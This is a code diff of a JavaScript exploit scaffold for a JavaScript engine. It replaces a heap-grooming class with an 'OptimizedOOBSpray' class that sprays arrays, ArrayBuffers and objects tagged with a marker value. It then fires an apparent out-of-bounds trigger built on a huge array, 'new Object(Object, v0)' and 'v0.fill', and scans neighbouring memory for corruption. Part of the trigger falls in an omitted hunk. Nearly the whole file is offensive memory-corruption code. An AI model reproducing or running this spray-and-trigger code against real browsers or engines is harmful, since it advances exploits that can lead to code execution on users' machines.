@@ -1,92 +1,76 @@
 import { log, sleep } from './module/utils.mjs';
 
-function gc() {
-    new Uint8Array(4 * 1024 * 1024);
-}
-
-class ContinuousOOBSpray {
+class OptimizedOOBSpray {
     constructor() {
-        this.spray = [];
+        this.arrays = [];
+        this.buffers = [];
+        this.objects = [];
         this.marker = 0x42424242;
         this.found = 0;
     }
 
     async execute() {
-        await this.continuousSprayAndCheck();
-    }
-
-    async continuousSprayAndCheck() {
         let round = 0;
-        
         while (true) {
             log("Round " + round);
             
-            // Heap grooming - create holes and patterns
-            await this.heapGrooming(round);
-            
-            // Spray arrays after grooming
-            await this.sprayArrays(round);
-            
-            // Trigger OOB
+            await this.mixedSpray(round);
             await this.triggerOOB();
+            await this.checkAll();
             
-            // Check for corruption
-            await this.checkCorruption(round);
-            
-            if (this.found > 0) {
-                log("SUCCESS: Found " + this.found + " corrupted arrays!");
+            if (this.found > 2) {
+                log("SUCCESS: " + this.found);
                 break;
             }
             
             round++;
-            await sleep(50);
+            if (round > 50) break;
+            await sleep(30);
         }
     }
 
-    async heapGrooming(round) {
-        // Create alternating pattern of allocations and frees
-        const tempBuffers = [];
-        
-        // Allocate various sizes to create fragmentation
-        for (let i = 0; i < 1000; i++) {
-            const size = 64 + (i % 8) * 16;
-            tempBuffers.push(new ArrayBuffer(size));
-        }
-        
-        // Free some to create holes
-        for (let i = 0; i < 500; i++) {
-            tempBuffers[i] = null;
-        }
-        
-        // Allocate more to fill holes
-        for (let i = 0; i < 300; i++) {
-            tempBuffers.push(new ArrayBuffer(128));
-        }
-        
-        log("Heap grooming round " + round + " completed");
-        gc();
-    }
-
-    async sprayArrays(round) {
-        for (let i = 0; i < 500; i++) {
+    async mixedSpray(round) {
+        for (let i = 0; i < 200; i++) {
             const arr = new Array(100);
-            for (let j = 0; j < arr.length; j++) {
+            for (let j = 0; j < 100; j++) {
                 arr[j] = {
                     marker: this.marker,
                     round: round,
-                    index: i,
-                    position: j
+                    idx: i,
+                    data: new ArrayBuffer(64)
                 };
             }
-            this.spray.push(arr);
+            this.arrays.push(arr);
         }
-        log("Sprayed " + this.spray.length + " total arrays");
+
+        for (let i = 0; i < 100; i++) {
+            const buffer = new ArrayBuffer(128);
+            const view = new Uint32Array(buffer);
+            view[0] = this.marker;
+            view[1] = round;
+            view[2] = i;
+            this.buffers.push(buffer);
+        }
+
+        for (let i = 0; i < 100; i++) {
+            this.objects.push({
+                type: "spray",
+                marker: this.marker,
+                round: round,
+                data: new Uint8Array(256)
+            });
+        }
     }
 
     async triggerOOB() {
         const v0 = [];
-        for (let i2 = 0; i2 < 1000000; i2++) {
-            v0[i2] = [];
+        for (let i2 = 0; i2 < 500000; i2++) {
+            v0[i2] = {
+                obj: true,
+                index: i2,
+                payload: new ArrayBuffer(32),
+                data: [1, 2, 3, 4, 5]
+            };
         }
         const v10 = new Object(Object, v0);
         function f11() {
@@ -99,17 +83,33 @@ class ContinuousOOBSpray {
         v0.fill(v10, o14);
     }
 
-    async checkCorruption(round) {
-        for (let i = 0; i < this.spray.length; i++) {
-            const arr = this.spray[i];
-            for (let j = arr.length; j < arr.length + 20; j++) {
-                if (arr[j] !== undefined && arr[j].marker === this.marker) {
-                    log("FOUND OOB: array " + i + " index " + j + " round " + arr[j].round);
+    async checkAll() {
+        for (let i = 0; i < this.arrays.length; i++) {
+            const arr = this.arrays[i];
+            for (let j = arr.length; j < arr.length + 30; j++) {
+                if (arr[j] && arr[j].marker === this.marker) {
+                    log("OOB array " + i + " at " + j);
                     this.found++;
                 }
+            }
+        }
+
+        for (let i = 0; i < this.buffers.length; i++) {
+            const view = new Uint32Array(this.buffers[i]);
+            if (view[50] === this.marker) {
+                log("OOB buffer " + i);
+                this.found++;
+            }
+        }
+
+        for (let i = 0; i < this.objects.length; i++) {
+            const obj = this.objects[i];
+            if (obj.unexpected) {
+                log("OOB object " + i);
+                this.found++;
             }
         }
     }
 }
 
-new ContinuousOOBSpray().execute();
+new OptimizedOOBSpray().execute();
